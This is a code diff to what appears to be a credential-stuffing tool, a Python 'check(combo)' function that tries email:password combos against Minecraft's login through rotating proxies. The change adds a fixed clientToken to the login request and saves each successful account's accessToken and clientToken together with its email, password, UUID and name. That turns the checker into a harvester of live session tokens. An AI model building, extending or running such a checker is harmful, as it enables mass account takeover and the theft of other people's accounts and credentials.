@@ -15,7 +15,8 @@ def check(combo):
             'version': 1
         },
         'username': email,
-        'password': password
+        'password': password,
+        'clientToken': "fff"
     })
     proxies_to_ban = []
     for i in range(settings.checkers.minecraft.check_amount):
@@ -40,11 +41,15 @@ def check(combo):
                 continue
             uuid = r.json().get("selectedProfile").get("id")
             name = r.json().get("selectedProfile").get("name")
+            accessToken = r.json().get("accessToken")
+            clientToken = r.json().get("clientToken")
             replace_dict = {
                 "email": email,
                 "password": password,
                 "uuid": uuid,
-                "name": name
+                "name": name,
+                "accessToken": accessToken,
+                "clientToken": clientToken
             }
 
             account = str(settings.checkers.minecraft.account_format).format(**replace_dict)
